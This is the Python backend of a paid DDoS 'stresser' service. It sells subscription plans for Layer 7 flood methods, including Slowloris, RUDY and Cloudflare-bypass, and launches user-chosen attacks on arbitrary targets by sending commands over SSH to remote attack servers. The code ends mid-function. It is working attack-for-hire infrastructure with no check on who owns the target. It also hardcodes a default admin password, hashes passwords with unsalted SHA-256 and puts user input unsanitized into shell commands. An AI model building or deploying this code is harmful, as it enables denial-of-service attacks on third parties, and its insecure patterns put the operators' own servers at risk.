from fastapi import FastAPI, APIRouter, HTTPException, Depends, Request, Header
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional, Dict
import uuid
from datetime import datetime, timezone, timedelta
import hashlib
import secrets
import jwt
import asyncio
import random
import paramiko
import bcrypt
import re
from emergentintegrations.payments.stripe.checkout import StripeCheckout, CheckoutSessionRequest

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_SECRET = os.environ.get('JWT_SECRET', 'stresser-secret-key-2024')
JWT_ALGORITHM = 'HS256'
JWT_EXPIRATION = 24 * 7

STRIPE_API_KEY = os.environ.get('STRIPE_API_KEY', 'sk_test_emergent')

app = FastAPI()
api_router = APIRouter(prefix="/api")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== SSH HELPER FUNCTIONS ====================

def get_server_stats_via_ssh(host: str, port: int, username: str, password: str = None, ssh_key: str = None, timeout: int = 10) -> dict:
    """
    Connect to server via SSH and get real CPU/RAM stats and CPU model.
    Returns dict with status, cpu_usage, ram_used, ram_total, cpu_model
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Connect using password or key
        if ssh_key:
            from io import StringIO
            key = paramiko.RSAKey.from_private_key(StringIO(ssh_key))
            ssh.connect(host, port=port, username=username, pkey=key, timeout=timeout)
        else:
            ssh.connect(host, port=port, username=username, password=password, timeout=timeout)
        
        stats = {"status": "online"}
        
        # Get CPU usage (1 second average)
        stdin, stdout, stderr = ssh.exec_command("top -bn1 | grep 'Cpu(s)' | awk '{print $2}' | cut -d'%' -f1", timeout=5)
        cpu_output = stdout.read().decode().strip()
        try:
            # Try different parsing methods for various Linux distributions
            if cpu_output:
                stats["cpu_usage"] = round(float(cpu_output), 1)
            else:
                # Alternative method using /proc/stat
                stdin, stdout, stderr = ssh.exec_command("cat /proc/stat | head -1 | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage}'", timeout=5)
                cpu_alt = stdout.read().decode().strip()
                stats["cpu_usage"] = round(float(cpu_alt), 1) if cpu_alt else 0
        except:
            stats["cpu_usage"] = 0
        
        # Get RAM info from /proc/meminfo
        stdin, stdout, stderr = ssh.exec_command("cat /proc/meminfo | head -3", timeout=5)
        mem_output = stdout.read().decode().strip()
        try:
            lines = mem_output.split('\n')
            mem_total = int(lines[0].split()[1]) / 1024 / 1024  # Convert to GB
            mem_free = int(lines[1].split()[1]) / 1024 / 1024
            # Check for MemAvailable (more accurate)
            if len(lines) > 2 and 'MemAvailable' in lines[2]:
                mem_available = int(lines[2].split()[1]) / 1024 / 1024
                mem_used = mem_total - mem_available
            else:
                mem_used = mem_total - mem_free
            
            stats["ram_total"] = round(mem_total, 1)
            stats["ram_used"] = round(mem_used, 1)
        except:
            stats["ram_total"] = 0
            stats["ram_used"] = 0
        
        # Get CPU model
        stdin, stdout, stderr = ssh.exec_command("cat /proc/cpuinfo | grep 'model name' | head -1 | cut -d':' -f2", timeout=5)
        cpu_model = stdout.read().decode().strip()
        stats["cpu_model"] = cpu_model if cpu_model else "Unknown CPU"
        
        # Get CPU cores count
        stdin, stdout, stderr = ssh.exec_command("nproc", timeout=5)
        cores = stdout.read().decode().strip()
        stats["cpu_cores"] = int(cores) if cores.isdigit() else 1
        
        # Get server uptime
        stdin, stdout, stderr = ssh.exec_command("uptime -p 2>/dev/null || uptime | awk -F'up ' '{print $2}' | awk -F',' '{print $1}'", timeout=5)
        uptime_output = stdout.read().decode().strip()
        stats["uptime"] = uptime_output if uptime_output else "Unknown"
        
        ssh.close()
        return stats
        
    except paramiko.AuthenticationException:
        return {"status": "offline", "error": "Authentication failed", "cpu_usage": 0, "ram_used": 0, "ram_total": 0, "cpu_model": "N/A", "uptime": "N/A"}
    except paramiko.SSHException as e:
        return {"status": "offline", "error": f"SSH error: {str(e)}", "cpu_usage": 0, "ram_used": 0, "ram_total": 0, "cpu_model": "N/A", "uptime": "N/A"}
    except Exception as e:
        return {"status": "offline", "error": str(e), "cpu_usage": 0, "ram_used": 0, "ram_total": 0, "cpu_model": "N/A", "uptime": "N/A"}
    finally:
        try:
            ssh.close()
        except:
            pass

# ==================== MODELS ====================

class UserRegister(BaseModel):
    username: str
    password: str
    telegram_id: str

class UserLogin(BaseModel):
    username: str
    password: str

class AttackRequest(BaseModel):
    target: str
    port: int = 80
    method: str
    duration: int
    concurrents: int

class MethodCommand(BaseModel):
    method_id: str
    command: str  # e.g., "./browser {target} {duration} proxy.txt {threads}"

class ServerCreate(BaseModel):
    name: str
    host: str
    ssh_port: int = 22
    ssh_user: str = "root"
    ssh_key: Optional[str] = None
    ssh_password: Optional[str] = None
    max_concurrent: int = 100
    method_commands: List[MethodCommand]  # Custom command per method
    # Custom start/stop command templates
    start_command: str = "screen -dmS {screen_name} {command}"
    stop_command: str = "screen -S {screen_name} -X quit 2>/dev/null; pkill -9 -f '{screen_name}' 2>/dev/null || true"

class ServerUpdate(BaseModel):
    name: Optional[str] = None
    host: Optional[str] = None
    ssh_port: Optional[int] = None
    ssh_user: Optional[str] = None
    ssh_key: Optional[str] = None
    ssh_password: Optional[str] = None
    max_concurrent: Optional[int] = None
    method_commands: Optional[List[MethodCommand]] = None
    is_active: Optional[bool] = None
    cpu_usage: Optional[float] = None
    ram_used: Optional[float] = None
    ram_total: Optional[float] = None
    cpu_model: Optional[str] = None
    cpu_cores: Optional[int] = None
    start_command: Optional[str] = None
    stop_command: Optional[str] = None

class ServerStatsUpdate(BaseModel):
    cpu_usage: float
    ram_used: float
    ram_total: Optional[float] = None
    cpu_model: Optional[str] = None
    cpu_cores: Optional[int] = None

class NewsCreate(BaseModel):
    title: str
    content: str
    type: str = "info"  # info, update, alert, promo
    is_active: bool = True

class NewsUpdate(BaseModel):
    title: Optional[str] = None
    content: Optional[str] = None
    type: Optional[str] = None
    is_active: Optional[bool] = None

class GlobalSettingsUpdate(BaseModel):
    global_max_concurrent: Optional[int] = None
    maintenance_mode: Optional[bool] = None
    # CoinPayments Settings
    coinpayments_merchant_id: Optional[str] = None
    coinpayments_ipn_secret: Optional[str] = None
    coinpayments_enabled: Optional[bool] = None
    accepted_crypto: Optional[List[str]] = None  # e.g., ["BTC", "LTC", "ETH", "USDT"]

class CheckoutRequest(BaseModel):
    plan_id: str
    origin_url: str

class PlanCreate(BaseModel):
    id: str
    name: str
    price: float = 0.0
    max_time: int = 60
    max_concurrent: int = 1
    methods: List[str] = []
    features: List[str] = []

class PlanUpdate(BaseModel):
    name: Optional[str] = None
    price: Optional[float] = None
    max_time: Optional[int] = None
    max_concurrent: Optional[int] = None
    methods: Optional[List[str]] = None
    features: Optional[List[str]] = None

# ==================== PLANS & METHODS ====================

PLANS = {
    "free": {
        "id": "free", "name": "Free", "price": 0.0,
        "max_time": 60, "max_concurrent": 1,
        "methods": ["HTTP-GET", "HTTP-POST"],
        "features": ["60s max attack", "1 concurrent", "Basic methods"]
    },
    "basic": {
        "id": "basic", "name": "Basic", "price": 19.99,
        "max_time": 300, "max_concurrent": 3,
        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS"],
        "features": ["5min max attack", "3 concurrent", "4 methods", "Attack logs"]
    },
    "premium": {
        "id": "premium", "name": "Premium", "price": 49.99,
        "max_time": 600, "max_concurrent": 5,
        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "TLS-BYPASS", "CF-BYPASS"],
        "features": ["10min max attack", "5 concurrent", "6 methods", "API Access", "Priority"]
    },
    "enterprise": {
        "id": "enterprise", "name": "Enterprise", "price": 99.99,
        "max_time": 1200, "max_concurrent": 10,
        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "TLS-BYPASS", "CF-BYPASS", "BROWSER-EMU", "RUDY"],
        "features": ["20min max attack", "10 concurrent", "All methods", "API Access", "24/7 Support"]
    }
}

DEFAULT_ATTACK_METHODS = [
    {"id": "HTTP-GET", "name": "HTTP GET Flood", "description": "Layer 7 GET request flood", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "HTTP-POST", "name": "HTTP POST Flood", "description": "Layer 7 POST request flood", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "HTTP-HEAD", "name": "HTTP HEAD", "description": "Layer 7 HEAD request flood", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "SLOWLORIS", "name": "Slowloris", "description": "Layer 7 slow HTTP attack", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "TLS-BYPASS", "name": "TLS Bypass", "description": "Layer 7 TLS/SSL bypass attack", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "CF-BYPASS", "name": "CF Bypass", "description": "Layer 7 Cloudflare bypass", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "BROWSER-EMU", "name": "Browser Emulation", "description": "Layer 7 browser simulation", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "RUDY", "name": "R-U-Dead-Yet", "description": "Layer 7 slow POST attack", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]}
]

class MethodCreate(BaseModel):
    id: str
    name: str
    description: str = ""

class MethodUpdate(BaseModel):
    name: Optional[str] = None
    description: Optional[str] = None

# ==================== HELPERS ====================

def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

def generate_api_key() -> str:
    return f"strs_{secrets.token_hex(32)}"

def create_token(user_id: str, role: str) -> str:
    payload = {
        "user_id": user_id,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=JWT_EXPIRATION)
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)

def verify_token(token: str) -> dict:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

async def get_current_user(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing or invalid token")
    token = authorization.split(" ")[1]
    payload = verify_token(token)
    user = await db.users.find_one({"id": payload["user_id"]}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=401, detail="User not found")
    return user

async def get_admin_user(user: dict = Depends(get_current_user)):
    if user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Admin access required")
    return user

async def get_global_settings():
    settings = await db.settings.find_one({"type": "global"}, {"_id": 0})
    if not settings:
        settings = {
            "type": "global", 
            "global_max_concurrent": 500, 
            "maintenance_mode": False,
            "coinpayments_merchant_id": "",
            "coinpayments_ipn_secret": "",
            "coinpayments_enabled": False,
            "accepted_crypto": ["BTC", "LTC", "ETH", "USDT", "DOGE"]
        }
        await db.settings.insert_one(settings)
    return settings

# ==================== INIT ====================

async def init_admin():
    admin = await db.users.find_one({"username": "admin"})
    if not admin:
        admin_user = {
            "id": str(uuid.uuid4()),
            "username": "admin",
            "password_hash": hash_password("Admin123!"),
            "telegram_id": "@admin",
            "role": "admin",
            "plan": "enterprise",
            "plan_expires": None,
            "api_key": generate_api_key(),
            "created_at": datetime.now(timezone.utc).isoformat()
        }
        await db.users.insert_one(admin_user)
        logger.info("Admin user created: admin / Admin123!")

async def init_methods():
    """Initialize default attack methods in database if not present"""
    existing = await db.attack_methods.count_documents({})
    if existing == 0:
        for method in DEFAULT_ATTACK_METHODS:
            await db.attack_methods.insert_one(method)
        logger.info(f"Initialized {len(DEFAULT_ATTACK_METHODS)} default attack methods")

@app.on_event("startup")
async def startup_event():
    await init_admin()
    await init_methods()
    await get_global_settings()

# ==================== AUTH ROUTES ====================

@api_router.post("/auth/register")
async def register(data: UserRegister):
    existing = await db.users.find_one({"username": data.username})
    if existing:
        raise HTTPException(status_code=400, detail="Username already exists")
    
    user_id = str(uuid.uuid4())
    user = {
        "id": user_id,
        "username": data.username,
        "password_hash": hash_password(data.password),
        "telegram_id": data.telegram_id,
        "role": "user",
        "plan": "free",
        "plan_expires": None,
        "api_key": generate_api_key(),
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.users.insert_one(user)
    
    token = create_token(user_id, "user")
    return {
        "token": token,
        "user": {
            "id": user_id, "username": data.username, "telegram_id": data.telegram_id,
            "role": "user", "plan": "free", "api_key": user["api_key"]
        }
    }

@api_router.post("/auth/login")
async def login(data: UserLogin):
    user = await db.users.find_one({"username": data.username}, {"_id": 0})
    if not user or user["password_hash"] != hash_password(data.password):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    token = create_token(user["id"], user["role"])
    return {
        "token": token,
        "user": {
            "id": user["id"], "username": user["username"], "telegram_id": user["telegram_id"],
            "role": user["role"], "plan": user["plan"], "plan_expires": user.get("plan_expires"),
            "api_key": user.get("api_key")
        }
    }

@api_router.get("/auth/me")
async def get_me(user: dict = Depends(get_current_user)):
    return {
        "id": user["id"], "username": user["username"], "telegram_id": user["telegram_id"],
        "role": user["role"], "plan": user["plan"], "plan_expires": user.get("plan_expires"),
        "api_key": user.get("api_key")
    }

@api_router.post("/auth/regenerate-key")
async def regenerate_api_key(user: dict = Depends(get_current_user)):
    new_key = generate_api_key()
    await db.users.update_one({"id": user["id"]}, {"$set": {"api_key": new_key}})
    return {"api_key": new_key}

# ==================== PUBLIC ROUTES ====================

@api_router.get("/plans")
async def get_plans():
    plans = await db.plans.find({}, {"_id": 0}).to_list(100)
    if not plans:
        # Initialize default plans if DB is empty
        for plan_data in PLANS.values():
            await db.plans.insert_one(plan_data)
        return list(PLANS.values())
    return plans

@api_router.get("/methods")
async def get_methods():
    methods = await db.attack_methods.find({}, {"_id": 0}).to_list(100)
    if not methods:
        return DEFAULT_ATTACK_METHODS
    return methods

# ==================== ADMIN - PLANS ====================

@api_router.post("/admin/plans")
async def admin_create_plan(data: PlanCreate, admin: dict = Depends(get_admin_user)):
    existing = await db.plans.find_one({"id": data.id})
    if existing:
        raise HTTPException(status_code=400, detail="Plan ID already exists")
    
    plan = data.model_dump()
    await db.plans.insert_one(plan)
    return {"message": "Plan created", "id": data.id}

@api_router.put("/admin/plans/{plan_id}")
async def admin_update_plan(plan_id: str, data: PlanUpdate, admin: dict = Depends(get_admin_user)):
    update_data = {k: v for k, v in data.model_dump().items() if v is not None}
    if not update_data:
        raise HTTPException(status_code=400, detail="No data to update")
    
    result = await db.plans.update_one({"id": plan_id}, {"$set": update_data})
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Plan not found")
    return {"message": "Plan updated"}

@api_router.delete("/admin/plans/{plan_id}")
async def admin_delete_plan(plan_id: str, admin: dict = Depends(get_admin_user)):
    if plan_id == "free":
        raise HTTPException(status_code=400, detail="Cannot delete free plan")
    
    result = await db.plans.delete_one({"id": plan_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Plan not found")
    
    # Move users on this plan to free
    await db.users.update_many({"plan": plan_id}, {"$set": {"plan": "free", "plan_expires": None}})
    return {"message": "Plan deleted, users moved to free"}

# ==================== ADMIN - METHODS ====================

@api_router.post("/admin/methods")
async def admin_create_method(data: MethodCreate, admin: dict = Depends(get_admin_user)):
    existing = await db.attack_methods.find_one({"id": data.id})
    if existing:
        raise HTTPException(status_code=400, detail="Method ID already exists")
    
    method = {
        "id": data.id,
        "name": data.name,
        "description": data.description,
        "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]
    }
    await db.attack_methods.insert_one(method)
    return {"message": "Method created", "id": data.id}

@api_router.put("/admin/methods/{method_id}")
async def admin_update_method(method_id: str, data: MethodUpdate, admin: dict = Depends(get_admin_user)):
    update_data = {k: v for k, v in data.model_dump().items() if v is not None}
    if not update_data:
        raise HTTPException(status_code=400, detail="No data to update")
    
    result = await db.attack_methods.update_one({"id": method_id}, {"$set": update_data})
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Method not found")
    return {"message": "Method updated"}

@api_router.delete("/admin/methods/{method_id}")
async def admin_delete_method(method_id: str, admin: dict = Depends(get_admin_user)):
    result = await db.attack_methods.delete_one({"id": method_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Method not found")
    
    # Cascade: Remove method from all plans
    await db.plans.update_many(
        {"methods": method_id},
        {"$pull": {"methods": method_id}}
    )
    
    # Cascade: Remove method commands from all servers
    await db.attack_servers.update_many(
        {"method_commands.method_id": method_id},
        {"$pull": {"method_commands": {"method_id": method_id}}}
    )
    
    return {"message": "Method deleted and removed from plans/servers"}

@api_router.get("/public/stats")
async def get_public_stats():
    now = datetime.now(timezone.utc)
    day_ago = (now - timedelta(days=1)).isoformat()
    
    total_users = await db.users.count_documents({})
    paid_users = await db.users.count_documents({"plan": {"$ne": "free"}})
    total_attacks = await db.attacks.count_documents({})
    attacks_24h = await db.attacks.count_documents({"started_at": {"$gte": day_ago}})
    
    # Just read from DB - ping is done separately via /admin/servers/{id}/ping
    servers = await db.attack_servers.find({"is_active": True}, {"_id": 0}).to_list(100)
    
    online_servers = [s for s in servers if s.get("status") == "online"]
    
    total_capacity = sum(s.get("max_concurrent", 0) for s in online_servers)
    current_load = await db.attacks.count_documents({"status": "running"})
    
    # Calculate total CPU and RAM
    total_cpu = sum(s.get("cpu_usage", 0) for s in online_servers) / max(len(online_servers), 1)
    total_ram_used = sum(s.get("ram_used", 0) for s in online_servers)
    total_ram_total = sum(s.get("ram_total", 0) for s in online_servers)
    
    # Hourly attacks for last 24 hours (for public display)
    attacks_per_hour = []
    for i in range(24):
        hour_start = now - timedelta(hours=i+1)
        hour_end = now - timedelta(hours=i)
        count = await db.attacks.count_documents({
            "started_at": {"$gte": hour_start.isoformat(), "$lt": hour_end.isoformat()}
        })
        attacks_per_hour.append({
            "hour": hour_end.strftime("%H:00"),
            "attacks": count
        })
    attacks_per_hour.reverse()
    
    return {
        "total_users": total_users,
        "paid_users": paid_users,
        "total_attacks": total_attacks,
        "attacks_24h": attacks_24h,
        "online_servers": len(online_servers),
        "total_servers": len(servers),
        "total_capacity": total_capacity,
        "current_load": current_load,
        "avg_cpu": round(total_cpu, 1),
        "total_ram_used": round(total_ram_used, 1),
        "total_ram_total": round(total_ram_total, 1),
        "attacks_per_hour": attacks_per_hour,
        "servers": [
            {
                "name": s["name"],
                "status": s.get("status", "offline"),
                "load": s.get("current_load", 0),
                "max_concurrent": s.get("max_concurrent", 0),
                "cpu_usage": s.get("cpu_usage", 0),
                "ram_used": s.get("ram_used", 0),
                "ram_total": s.get("ram_total", 0),
                "cpu_model": s.get("cpu_model", ""),
                "cpu_cores": s.get("cpu_cores", 0),
                "uptime": s.get("uptime", "N/A"),
                "methods": list(s.get("method_commands", {}).keys()) if isinstance(s.get("method_commands"), dict) else [mc.get("method_id") for mc in s.get("method_commands", [])]
            }
            for s in servers
        ]
    }

# ==================== ATTACK ROUTES ====================

async def select_best_server(method: str, concurrents: int):
    servers = await db.attack_servers.find({
        "is_active": True,
        "status": "online"
    }, {"_id": 0}).to_list(100)
    
    # Filter servers that support this method
    valid_servers = []
    for server in servers:
        method_commands = server.get("method_commands", [])
        if isinstance(method_commands, list):
            methods = [mc.get("method_id") for mc in method_commands]
        else:
            methods = list(method_commands.keys())
        if method in methods:
            valid_servers.append(server)
    
    if not valid_servers:
        return None
    
    for server in valid_servers:
        server["available"] = server.get("max_concurrent", 0) - server.get("current_load", 0)
    
    valid_servers.sort(key=lambda x: x["available"], reverse=True)
    
    best = valid_servers[0]
    if best["available"] >= concurrents:
        return best
    return None

def build_attack_command(server: dict, attack: dict, username: str) -> str:
    """Build the attack command using server's custom start template"""
    method_commands = server.get("method_commands", [])
    command_template = None
    
    if isinstance(method_commands, list):
        for mc in method_commands:
            if mc.get("method_id") == attack["method"]:
                command_template = mc.get("command")
                break
    else:
        command_template = method_commands.get(attack["method"])
    
    if not command_template:
        return None
    
    # Replace placeholders in method command
    command = command_template.replace("{target}", str(attack["target"]))
    command = command.replace("{port}", str(attack["port"]))
    command = command.replace("{duration}", str(attack["duration"]))
    command = command.replace("{threads}", str(attack["concurrents"]))
    command = command.replace("{time}", str(attack["duration"]))
    command = command.replace("{site}", str(attack["target"]))
    
    # Create screen session name: username + attack_id (last 6 chars)
    screen_name = f"{username}{attack['id'][-6:]}"
    
    # Get server's start command template or use default
    start_template = server.get("start_command", "screen -dmS {screen_name} {command}")
    
    # Replace placeholders in start command
    full_command = start_template.replace("{screen_name}", screen_name)
    full_command = full_command.replace("{command}", command)
    full_command = full_command.replace("{username}", username)
    full_command = full_command.replace("{attack_id}", attack["id"])
    
    return full_command, screen_name

def build_stop_command(server: dict, screen_name: str, username: str = "", attack_id: str = "") -> str:
    """Build the stop command using server's custom stop template"""
    # Get server's stop command template or use default
    stop_template = server.get("stop_command", "screen -S {screen_name} -X quit 2>/dev/null; pkill -9 -f '{screen_name}' 2>/dev/null || true")
    
    # Replace placeholders
    stop_command = stop_template.replace("{screen_name}", screen_name)
    stop_command = stop_command.replace("{username}", username)
    stop_command = stop_command.replace("{attack_id}", attack_id)
    
    return stop_command

def execute_ssh_command_sync(host, port, username, password, ssh_key, command):
    """Execute command via SSH (synchronous for thread executor)"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        if ssh_key:
            from io import StringIO
            key = paramiko.RSAKey.from_private_key(StringIO(ssh_key))
            ssh.connect(host, port=port, username=username, pkey=key, timeout=10)
        else:
            ssh.connect(host, port=port, username=username, password=password, timeout=10)
        
        stdin, stdout, stderr = ssh.exec_command(command, timeout=30)
        output = stdout.read().decode()
        error = stderr.read().decode()
        exit_code = stdout.channel.recv_exit_status()
        
        ssh.close()
        return {
            "success": exit_code == 0,
            "output": output,
            "error": error
        }
    except Exception as e:
        return {"success": False, "output": "", "error": str(e)}
    finally:
        try:
            ssh.close()
        except:
            pass

async def execute_attack_on_server(server: dict, attack: dict, username: str):
    """Execute attack command on server via SSH using screen"""
    result = build_attack_command(server, attack, username)
    if not result:
        return False, None, None
    
    command, screen_name = result
    
    logger.info(f"Starting attack on server {server['name']}: {command}")
    
    # Execute command via SSH
    loop = asyncio.get_event_loop()
    ssh_result = await loop.run_in_executor(
        None,
        execute_ssh_command_sync,
        server.get('host'),
        server.get('ssh_port', 22),
        server.get('ssh_user', 'root'),
        server.get('ssh_password'),
        server.get('ssh_key'),
        command
    )
    
    if not ssh_result.get("success") and ssh_result.get("error"):
        logger.error(f"Failed to start attack: {ssh_result.get('error')}")
        # Even if there's an error, screen command usually returns 0
        # Check if it's a real error
        if "ssh" in ssh_result.get("error", "").lower():
            return False, None, None
    
    # Update server load
    await db.attack_servers.update_one(
        {"id": server["id"]},
        {"$inc": {"current_load": attack["concurrents"]}}
    )
    
    return True, command, screen_name

async def stop_attack_on_server(server: dict, screen_name: str, username: str = "", attack_id: str = ""):
    """Stop attack on server using server's custom stop command template"""
    # Build stop command from server template
    kill_command = build_stop_command(server, screen_name, username, attack_id)
    
    logger.info(f"Stopping attack on server {server['name']}: {kill_command}")
    
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(
        None,
        execute_ssh_command_sync,
        server.get('host'),
        server.get('ssh_port', 22),
        server.get('ssh_user', 'root'),
        server.get('ssh_password'),
        server.get('ssh_key'),
        kill_command
    )
    
    return result.get("success", True)  # Usually succeeds even if process already dead

async def release_server_load(server_id: str, concurrents: int):
    await db.attack_servers.update_one(
        {"id": server_id},
        {"$inc": {"current_load": -concurrents}}
    )
    # Ensure load doesn't go negative
    await db.attack_servers.update_one(
        {"id": server_id, "current_load": {"$lt": 0}},
        {"$set": {"current_load": 0}}
    )

@api_router.post("/attacks")
async def create_attack(data: AttackRequest, user: dict = Depends(get_current_user)):
    settings = await get_global_settings()
    
    if settings.get("maintenance_mode"):
        raise HTTPException(status_code=503, detail="System is under maintenance")
    
    # Check cooldown - user's last attack must be at least 1 second ago
    last_attack = await db.attacks.find_one(
        {"user_id": user["id"]},
        {"_id": 0, "started_at": 1},
        sort=[("started_at", -1)]
    )
    if last_attack:
        try:
            last_time = datetime.fromisoformat(last_attack["started_at"].replace('Z', '+00:00'))
            if (datetime.now(timezone.utc) - last_time).total_seconds() < 1:
                raise HTTPException(status_code=429, detail="Cooldown: Please wait 1 second between attacks")
        except:
            pass
    
    user_plan = PLANS.get(user["plan"], PLANS["free"])
    
    if data.duration > user_plan["max_time"]:
        raise HTTPException(status_code=400, detail=f"Max duration: {user_plan['max_time']}s")
    if data.concurrents > user_plan["max_concurrent"]:
        raise HTTPException(status_code=400, detail=f"Max concurrent: {user_plan['max_concurrent']}")
    if data.method not in user_plan["methods"]:
        raise HTTPException(status_code=400, detail="Method not available in your plan")
    
    user_running = await db.attacks.count_documents({"user_id": user["id"], "status": "running"})
    if user_running >= user_plan["max_concurrent"]:
        raise HTTPException(status_code=400, detail="Max concurrent attacks reached")
    
    global_running = await db.attacks.count_documents({"status": "running"})
    if global_running >= settings.get("global_max_concurrent", 500):
        raise HTTPException(status_code=503, detail="Global capacity reached")
    
    server = await select_best_server(data.method, data.concurrents)
    if not server:
        raise HTTPException(status_code=503, detail="No available servers for this method")
    
    attack_id = str(uuid.uuid4())
    attack = {
        "id": attack_id,
        "user_id": user["id"],
        "username": user["username"],
        "target": data.target,
        "port": data.port,
        "method": data.method,
        "duration": data.duration,
        "concurrents": data.concurrents,
        "server_id": server["id"],
        "server_name": server["name"],
        "status": "running",
        "started_at": datetime.now(timezone.utc).isoformat(),
        "ended_at": None,
        "command": None,
        "screen_name": None
    }
    
    success, command, screen_name = await execute_attack_on_server(server, attack, user["username"])
    attack["command"] = command
    attack["screen_name"] = screen_name
    
    if not success:
        raise HTTPException(status_code=500, detail="Failed to start attack on server")
    
    await db.attacks.insert_one(attack)
    asyncio.create_task(schedule_attack_end(attack_id, server["id"], data.concurrents, data.duration, screen_name, server, user["username"]))
    
    # 1 second cooldown enforced by sleeping
    await asyncio.sleep(1)
    
    return {"id": attack_id, "status": "running", "server": server["name"], "screen_name": screen_name}

async def schedule_attack_end(attack_id: str, server_id: str, concurrents: int, duration: int, screen_name: str, server: dict, username: str = ""):
    """Wait for attack duration then stop it"""
    await asyncio.sleep(duration)
    attack = await db.attacks.find_one({"id": attack_id}, {"_id": 0})
    if attack and attack["status"] == "running":
        # Stop the attack on server
        if screen_name and server:
            await stop_attack_on_server(server, screen_name, username, attack_id)
        
        await db.attacks.update_one(
            {"id": attack_id},
            {"$set": {"status": "completed", "ended_at": datetime.now(timezone.utc).isoformat()}}
        )
        await release_server_load(server_id, concurrents)

@api_router.post("/attacks/{attack_id}/stop")
async def stop_attack(attack_id: str, user: dict = Depends(get_current_user)):
    attack = await db.attacks.find_one({"id": attack_id, "user_id": user["id"]}, {"_id": 0})
    if not attack:
        raise HTTPException(status_code=404, detail="Attack not found")
    if attack["status"] != "running":
        raise HTTPException(status_code=400, detail="Attack is not running")
    
    # Get server info
    server = await db.attack_servers.find_one({"id": attack["server_id"]}, {"_id": 0})
    
    # Stop the attack on server via SSH
    screen_name = attack.get("screen_name")
    username = attack.get("username", "")
    if screen_name and server:
        await stop_attack_on_server(server, screen_name, username, attack_id)
    
    await db.attacks.update_one(
        {"id": attack_id},
        {"$set": {"status": "stopped", "ended_at": datetime.now(timezone.utc).isoformat()}}
    )
    await release_server_load(attack["server_id"], attack["concurrents"])
    
    # 1 second cooldown
    await asyncio.sleep(1)
    
    return {"message": "Attack stopped"}

@api_router.get("/attacks")
async def get_attacks(user: dict = Depends(get_current_user), limit: int = 50):
    attacks = await db.attacks.find(
        {"user_id": user["id"]}, {"_id": 0}
    ).sort("started_at", -1).limit(limit).to_list(limit)
    return attacks

@api_router.get("/attacks/running")
async def get_running_attacks(user: dict = Depends(get_current_user)):
    attacks = await db.attacks.find(
        {"user_id": user["id"], "status": "running"}, {"_id": 0}
    ).to_list(100)
    return attacks

# ==================== ADMIN - SERVERS ====================

@api_router.get("/admin/servers")
async def admin_get_servers(admin: dict = Depends(get_admin_user)):
    servers = await db.attack_servers.find({}, {"_id": 0}).to_list(100)
    return servers

@api_router.post("/admin/servers")
async def admin_create_server(data: ServerCreate, admin: dict = Depends(get_admin_user)):
    server_id = str(uuid.uuid4())
    
    # Convert method_commands list to dict for easier lookup
    method_commands_list = [{"method_id": mc.method_id, "command": mc.command} for mc in data.method_commands]
    
    server = {
        "id": server_id,
        "name": data.name,
        "host": data.host,
        "ssh_port": data.ssh_port,
        "ssh_user": data.ssh_user,
        "ssh_key": data.ssh_key,
        "ssh_password": data.ssh_password,
        "max_concurrent": data.max_concurrent,
        "current_load": 0,
        "method_commands": method_commands_list,
        "start_command": data.start_command,
        "stop_command": data.stop_command,
        "is_active": True,
        "status": "offline",
        "cpu_usage": 0,
        "ram_used": 0,
        "ram_total": 0,
        "last_ping": None,
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.attack_servers.insert_one(server)
    return {"id": server_id, "message": "Server created"}

@api_router.put("/admin/servers/{server_id}")
async def admin_update_server(server_id: str, data: ServerUpdate, admin: dict = Depends(get_admin_user)):
    update_data = {}
    for k, v in data.model_dump().items():
        if v is not None:
            if k == "method_commands" and v:
                # Handle both dict and MethodCommand objects
                update_data[k] = [
                    {"method_id": mc.get("method_id") if isinstance(mc, dict) else mc.method_id, 
                     "command": mc.get("command") if isinstance(mc, dict) else mc.command} 
                    for mc in v
                ]
            else:
                update_data[k] = v
    
    if not update_data:
